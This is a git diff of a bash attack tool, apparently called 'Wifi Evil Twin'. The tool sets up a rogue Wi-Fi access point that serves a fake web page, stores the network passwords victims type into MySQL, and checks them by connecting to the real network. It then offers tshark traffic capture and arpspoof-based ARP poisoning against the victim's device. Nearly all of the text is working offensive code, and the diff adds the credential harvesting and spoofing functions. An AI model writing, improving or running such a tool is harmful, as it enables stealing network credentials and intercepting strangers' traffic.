@@ -5,27 +5,34 @@
 # Version: 1.0
 # Date Created: 14/01/2023
 
-import_vars="vars.sh"
+lib_dir_path="/usr/local/lib/etclon3r_lib/"
+import_vars="${lib_dir_path}vars"
+import_webpage="${lib_dir_path}web"
+import_db="${lib_dir_path}db_conf"
+import_zipfile="${lib_dir_path}file.zip"
 
-# Privilege check
-clear 
-sleep 0.5
 
 source $import_vars
 
 trap handle_ctrl_c SIGINT
 
+function banner()
+{
 echo "	
-██╗    ██╗██╗███████╗██╗    ███████╗██╗   ██╗██╗██╗         ████████╗██╗    ██╗██╗███╗   ██╗
-██║    ██║██║██╔════╝██║    ██╔════╝██║   ██║██║██║         ╚══██╔══╝██║    ██║██║████╗  ██║
-██║ █╗ ██║██║█████╗  ██║    █████╗  ██║   ██║██║██║            ██║   ██║ █╗ ██║██║██╔██╗ ██║
-██║███╗██║██║██╔══╝  ██║    ██╔══╝  ╚██╗ ██╔╝██║██║            ██║   ██║███╗██║██║██║╚██╗██║
-╚███╔███╔╝██║██║     ██║    ███████╗ ╚████╔╝ ██║███████╗       ██║   ╚███╔███╔╝██║██║ ╚████║
- ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚══════╝  ╚═══╝  ╚═╝╚══════╝       ╚═╝    ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝
+ ██╗    ██╗██╗███████╗██╗    ███████╗██╗   ██╗██╗██╗         ████████╗██╗    ██╗██╗███╗   ██╗
+ ██║    ██║██║██╔════╝██║    ██╔════╝██║   ██║██║██║         ╚══██╔══╝██║    ██║██║████╗  ██║
+ ██║ █╗ ██║██║█████╗  ██║    █████╗  ██║   ██║██║██║            ██║   ██║ █╗ ██║██║██╔██╗ ██║
+ ██║███╗██║██║██╔══╝  ██║    ██╔══╝  ╚██╗ ██╔╝██║██║            ██║   ██║███╗██║██║██║╚██╗██║
+ ╚███╔███╔╝██║██║     ██║    ███████╗ ╚████╔╝ ██║███████╗       ██║   ╚███╔███╔╝██║██║ ╚████║
+  ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚══════╝  ╚═══╝  ╚═╝╚══════╝       ╚═╝    ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝
 "
+}
 
 
 if [ $USER = root ]; then
+	clear
+	sleep 0.5
+	banner
 	echo "[*] You are root"
 else
 	echo -e "${RED}[-] Run script as root"
@@ -33,12 +40,13 @@ else
 fi
 
 
-if [ -f "${db_configuration}" ] && [ -f "${zipfile}" ] ; then
-    path_to_file=$(pwd)
+if [ -f "${import_db}" ] && [ -f "${import_zipfile}" ] ; then
+    current_location=$(pwd)
 else
-    echo "[-] Could not find either ${db_configuration} or ${zipfile}"
+    echo "[-] Could not find either ${import_db} or ${import_zipfile}"
     exit 1
 fi
+
 
 function handle_ctrl_c {
 	tmux_running=$(pgrep -f xterm | tr '\n' ' ')
@@ -46,7 +54,6 @@ function handle_ctrl_c {
 	if [[ -n $tmux_running ]]; then
 		echo -e "\n[#] Ctrl+C caught. Exiting..."
 		tmux_pid+=($(pgrep -f xterm | tr '\n' ' '))
-		sleep 1
 		for pid in "${tmux_pid[@]}"; do
 			kill -9 $pid > /dev/null 2>&1
 			sleep 0.3
@@ -59,7 +66,7 @@ function handle_ctrl_c {
     	echo -e "\n[#] Ctrl+C caught. Exiting..."
     	exit 0
     fi
-} 
+}
 
 
 # Checking current interfacen & etwork
@@ -84,6 +91,7 @@ function Preparation()
 # Wifi network scan and comparison
 function Wifi_networks_scan()
 {
+	wifi_networks_scanner=$(iwlist $wireless_interface_name scan 2> /dev/null| grep "ESSID"| cut -d '"' -f 2)
 	declare -a networks_list=($wifi_networks_scanner)
 	length=${#networks_list[@]}
 
@@ -103,14 +111,14 @@ function Wifi_networks_scan()
 			if [ "$Current_connected_net" != 'None' ]; then
 				if [ "$selected_network" != "$Current_connected_net" ]; then
 
-					if [[ "$wifi_networks_scanner" == *"$selected_network"* ]]; then
+					if [[ "${wifi_networks_scanner}" == *"${selected_network}"* ]]; then
 						echo "[*] You selected - $selected_network, proceeding..."
 						password_file="${tmpdir}wifi_${selected_network}_password.txt"
 						touch $password_file > /dev/null 2>&1
 						break
 					
 					else
-						echo "[-] $selected_network network doesn't exist."
+						echo "[-] network - $selected_network doesn't exist."
 					fi
 
 				else
@@ -123,12 +131,12 @@ function Wifi_networks_scan()
 					echo "[*] You selected - $selected_network, proceeding..."
 					password_file="${tmpdir}wifi_${selected_network}_password.txt"
 					touch "$password_file" > /dev/null 2>&1
-					echo $selected_network >> $import_vars
 					break
 				fi
 			fi
 			
 		done
+
 	else
 		Wifi_networks_scan
 	fi
@@ -191,8 +199,7 @@ no-hosts" > ${conf_dir}${ET_dir}${dnsmasq_conf_file}
 	
 	echo "[*] Unzipping web files to $webdir"
 	mkdir ${webdir}
-	# mv ${zipfile} ${conf_dir}${ET_dir}
-	unzip -qq ${zipfile} -d ${webdir}
+	unzip -qq ${import_zipfile} -d ${webdir}
 	
 	echo "[*] Altering lighttpd conf file"
 	{
@@ -233,12 +240,15 @@ no-hosts" > ${conf_dir}${ET_dir}${dnsmasq_conf_file}
 	} > ${conf_dir}${ET_dir}${server_conf_file}
 	sleep 1
 	
-	source $confirm_html_page
+	source $import_webpage
+	create_web_page "$password_file" "$webdir" "$confirm_file"
 
 	service lighttpd start
+	kill  "$(ps -C lighttpd --no-header -o pid |  tr -d ' ' )" > /dev/null 2>&1
+
 	service mysql start
 
-	kill  "$(ps -C lighttpd --no-header -o pid |  tr -d ' ' )" > /dev/null 2>&1
+	kill  "$(ps -C hostapd --no-header -o pid |  tr -d ' ' )" > /dev/null 2>&1
 	kill  "$(ps -C dnsmasq --no-header -o pid |  tr -d ' ' )" > /dev/null 2>&1
 
 	echo "[*] Opening terminals..."
@@ -254,7 +264,7 @@ function opening_terminals()
 
 	tmux new-session -d -s Evil-Twin
 
-	tmux new-window -t Evil-Twin:1 -n "Control Panel" "xterm -geometry 94x73--61--67 -hold -T Control_Panel -fs 30 -e bash -c 'source ${path_to_file}/${db_configuration} ${selected_network} ${password_file} ${tmpdir}${variables_file}'"
+	tmux new-window -t Evil-Twin:1 -n "Control Panel" "xterm -geometry 94x73--61--67 -hold -T Control_Panel -fs 30 -e bash -c 'source $import_db ${password_file} ${tmpdir}${variables_file}'"
 	sleep 0.5
 	tmux new-window -t Evil-Twin:2 -n "AP" "xterm -l -lf ${tmpdir}${hostapd_output} -geometry 125x25+-61+86 -hold -T AP -fg green -fs 30 -e hostapd ${conf_dir}${ET_dir}${hostapd_conf_file}"
 	sleep 0.5
@@ -274,43 +284,38 @@ function opening_terminals()
 function closing_terminals()
 {
 	while true; do
-		if [ $? -eq 1 ]; then 
-			echo "${RED}[-] Problem occured. Quiting..."
+
+		if [[ -s $password_file ]]; then
+
+			date=$(date +%d%b%Y_%T)
+
+			echo -e "[*] Credentials captured"
 			tmux_pid+=($(pgrep -f xterm | tr '\n' ' '))
-			sleep 4
+			sleep 1
+
+			password1=$(cat $password_file | cut -d "&" -f 1 | cut -d "=" -f 2 )
+			password2=$(cat $password_file | cut -d "&" -f 2 | cut -d "=" -f 2 )
+			
+			query="INSERT INTO ${tablename} (password1, password2) VALUES (\"${password1}\", \"${password2}\");"
+			mysql -h "${db_host}" -u "${username}" -p"${userpasswd}" "${dbname}" -e "${query}"
 	
-			for pid in "${tmux_pid[@]}"; do
-				kill -9 $pid > /dev/null 2>&1
+			for pid in "${!tmux_pid[@]}"; do
+				if [[ $pid -eq 0 ]]; then
+					 continue
+				fi
+				kill -9 ${tmux_pid[$pid]} > /dev/null 2>&1
+				unset tmux_pid[$pid]
 				sleep 0.3
 			done
+
+			echo "[#] Press any key to proceed..."
+			read	
+			kill -9 "${tmux_pid[0]}"
+
 			tmux kill-session -t Evil-Twin
-			delete
-			exit 1
-		else
-			if [[ -s $password_file ]]; then
-				echo -e "[*] Credentials captured"
-
-				raw_password1=$(cat $password_file | cut -d "&" -f 1 | cut -d "=" -f 2 )
-				password1=$(echo $raw_password1 | sed 's/%\([0-9A-F][0-9A-F]\)/\\x\1/g' )
-				password2=$(cat $password_file | cut -d "&" -f 2 | cut -d "=" -f 2 )
-				echo $password1
-				echo $password2
-				
-				query="INSERT INTO ${tablename} (password1, password2) VALUES (\"${password1}\", \"${password2}\");"
-				mysql -h "${db_host}" -u "${username}" -p"${userpasswd}" "${dbname}" -e "${query}"
-			
-				tmux_pid+=($(pgrep -f xterm | tr '\n' ' '))
-				sleep 4
-				
-				for pid in "${tmux_pid[@]}"; do
-					kill -9 $pid > /dev/null 2>&1
-					sleep 0.3
-				done
-
-				tmux kill-session -t Evil-Twin
-				break
-			fi
+			break
 		fi
+	
 	done
 	sleep 2 
 }
@@ -319,18 +324,21 @@ function closing_terminals()
 # Network reconnaissance and traffic dump
 function network_recon()
 {	
+	clear
+	banner
+
 	delete 
 	sleep 2
-	echo "[#] Trying to connect to $selected_network with captured credentials..."
+	echo "[#] Trying to connect to ${selected_network} network with captured credentials..."
 	if [ "$password1" = "$password2" ]; then
 	    nmcli d wifi connect "$selected_network" password "$password1" ifname "$wireless_interface_name" > /dev/null 2>&1
 		if [ $? -eq 0 ]; then
 	    	echo -e "${GREEN}[*] Successfully connected to $selected_network with [$password1] password"
 	    	echo "Wifi password is: $password1" > $password_file
 	    else
-	    	echo -e "${RED}[-] Password wasn't found! Provided password was [$password1]. Exiting..."
 	    	echo "Wifi password wasn't found! Provided passwords was: $password1" > $password_file
-	    	exit 1
+	    	echo -e "${RED}[-] Password wasn't found! Provided password was [$password1]. Exiting..."
+	    	fail=1
 	    fi
 	
 	else
@@ -344,42 +352,55 @@ function network_recon()
 	   			echo -e "${GREEN}[*] Successfully connected to $selected_network with [$password2] password"
 	    		echo "Wifi password is: $password2" > $password_file
 			else
-	   			echo -e "${RED}[-] Password wasn't found! Provided passwords were [$password1] and [$password2]. Exiting..."
 	    		echo "Wifi password wasn't found! Two different passwords were provided: $password1; $password2" > $password_file
-	    		exit 1
+	   			echo -e "${RED}[-] Password wasn't found! Provided passwords were [$password1] and [$password2]. Exiting..."
+	   			fail=1
 			fi
 	    fi
 	fi
 	
-	echo -e $Color_Off
-	sleep 2
-	if [ $? -eq 0 ]; then
-		current_ip=$(hostname -I)
-		read -e -p "[?] How long to you to intercept the traffic [sec]: " sec
-		echo "[#] Intercepting for \"${sec}\""
-		tshark -w "${tmpdir}${pcapfile}" -a duration:$sec > /dev/null 2>&1
-		echo "[*] Captured traffic saved in ${tmpdir}${pcapfile} file"
-		chown $non_priv_user:$non_priv_user ${tmpdir}${pcapfile}
+
+	extension="${password_file##*.}"
+	newpasswordfile="${password_file%.*}_$date.$extension"
+	mv "${password_file}" "${newpasswordfile}"
+	mv "$newpasswordfile" ${current_location}
+
+	if [ $fail -eq 1 ]; then
+		rm ${tmpdir}${hostapd_output}
+		exit 1
 	fi
+
+	echo -e $Color_Off
 }
 
 
 # Catching users mac address and scanning the network
-function check_mac_address()
-{
-	connected_mac=$(cat $tmpdir$hostapd_output | grep "AP-STA-CONNECTED" | awk '{print $3}')
-	
-	echo "[*] Searching for connected device MAC address"
-	arp-scan --localnet --interface=wlan0 | awk '{print $2}' |  grep "${connected_mac}" 
-	if [[ $? -eq 0 ]]; then
-		echo "[*] MAC Found!!"
-		echo "[*] Starting ARP poisoning!!"
-		arp-scan --localnet --interface=wlan0 | awk '{print $1,$2}' | grep "$connected_mac" | cut -d " " -f 1
-		### arp poisoning here
-	else
-		echo "[-] Couldn't find MAC address"
-	fi
+function actions()
+{	
+	PS3="[?] Choose option above: "
+	select option in 'Traffic Capture' 'ARP Spoofing'; do
+	    case "$REPLY" in
+
+	        1)
+	            echo "[#] Traffic capture was selected. Proceeding..."
+	         	traffic_capture
+	            break
+	            ;;
+
+	        2)
+				echo "[#] ARP Spoofing was selected. Proceeding..."
+				arp_spoofing
+				break
+				;;
+
+	        *)
+	            echo "Invalid input"
+	            ;;
+	    esac
+	done
 	rm ${tmpdir}${hostapd_output}
+	echo "[*] All operation completed !"
+
 }
 
 
@@ -387,30 +408,118 @@ function check_mac_address()
 function delete()
 {	
 	echo "[*] Cleaning up..."
+	
 	echo '[*] Deleting mysql user..'
 	sleep 1
 	mysql -e "DROP USER '${username}'@'localhost';"
 	echo "[*] Deleting database..."
 	sleep 1
 	mysql -e "DROP DATABASE ${dbname};"
+	
 	echo '[*] Exiting monitor mode...'
 	ifconfig $monitor_mode down > /dev/null 2>&1
 	ip link set $monitor_mode name $wireless_interface_name > /dev/null 2>&1
 	ifconfig $wireless_interface_name up > /dev/null 2>&1
 	sleep 0.5
-	service NetworkManager restart
+	service NetworkManager restart > /dev/null 2>&1
+	
 	echo '[*] Stopping services...'
-	sleep 2
+	sleep 1
 	service lighttpd stop > /dev/null 2>&1
 	service mysql stop > /dev/null 2>&1
 	iptables --flush
-	route del -net 192.168.0.0 netmask 255.255.255.0
+	route del -net 192.168.0.0 netmask 255.255.255.0 > /dev/null 2>&1
 	echo 0 > /proc/sys/net/ipv4/ip_forward
+	
 	echo '[*] Removing used files...'
 	rm -rf ${webdir}
 	rm -rf ${conf_dir}${ET_dir}
-	rm "$password_file"
+
 	echo "[*] Cleaning completed"
+}
+
+
+# Traffic capture
+function traffic_capture()
+{
+	sleep 3
+	read -e -p "[?] How long to you to intercept the traffic [sec]: " sec
+	echo "[#] Intercepting for \"${sec}\" seconds"
+	tshark -w "${current_location}/${pcapfile}" -a duration:$sec & > /dev/null 2>&1
+	echo '[*] Captured traffic saved in "${current_location}/${pcapfile}" file'
+	chown "$non_priv_user":"$non_priv_user" ${current_location}${pcapfile}
+}
+
+
+# ARP reconnaissance
+function arp_spoofing()
+{
+	local grep_mac
+	local host_ip
+
+	sleep 3
+	connected_mac=$(cat ${tmpdir}${hostapd_output} | grep "AP-STA-CONNECTED" | awk '{print $3}')
+
+	echo "[*] Searching for connected device's MAC address"
+	echo '**************************'
+	grep_mac=$(arp-scan --localnet --interface=wlan0 | awk '{print $2}' |  grep "${connected_mac}")
+	
+	if [[ -n "$grep_mac" ]]; then	
+		echo "[*] MAC Found!!"
+
+		host_ip=$(arp-scan --localnet --interface=wlan0 | awk '{print $1,$2}' | grep "$connected_mac" | cut -d " " -f 1)
+
+     	if [ -n "$host_ip" ]; then
+     		echo "[*] Victim's IP Found!"
+     		echo "[*] Starting ARP spoofing"
+     		arp_spoofing_exploitation
+     	else
+     		echo "[-] Couldn't find Victim's IP"
+     		read -p "[?] Rescan MAC and IP address?[y/N] " yn
+
+     		case $yn in  
+     			[Yy])
+					echo "[#] Rescaning network..."
+					arp_spoofing
+					;;
+
+				[Nn|*]) 
+					echo "[#] Exiting..."
+					exit 0
+					;;
+     		esac
+     	fi
+
+    else
+		if [[ $scans -eq 5 ]]; then
+			echo "[-] MAC address wasn't found. Quiting..."
+		else
+			echo "[-] Couldn't find MAC address"
+			echo "[#] Rescaning...."
+			((scans++))
+			sleep 4
+			arp_spoofing
+		fi
+	fi
+}
+
+
+# ARP spoofing exploitation
+function arp_spoofing_exploitation()
+{
+	echo 1 > /proc/sys/net/ipv4/ip_forward
+	router_ip=$(ip r | cut -d " " -f 3 | tr '\n' ' ' | awk '{print $1}')
+
+	arpspoof -i $wireless_interface_name -t $host_ip $router_ip > /dev/null 2>&1 &
+	arpspoof -i $wireless_interface_name -t $router_ip $host_ip > /dev/null 2>&1 &
+
+	arp_spoof_pid=$(ps -C arpspoof --no-header -o pid | tr '\n' ' ')
+
+	echo "[#] Press any key to stop spoofing..."
+	read
+
+	pkill arpspoof
+	echo 0 > /proc/sys/net/ipv4/ip_forward
 }
 
 
@@ -421,7 +530,7 @@ function pwn()
 	Wifi_networks_scan
 	AP_set_up
 	network_recon
-	check_mac_address
+	actions
 }
 
 pwn
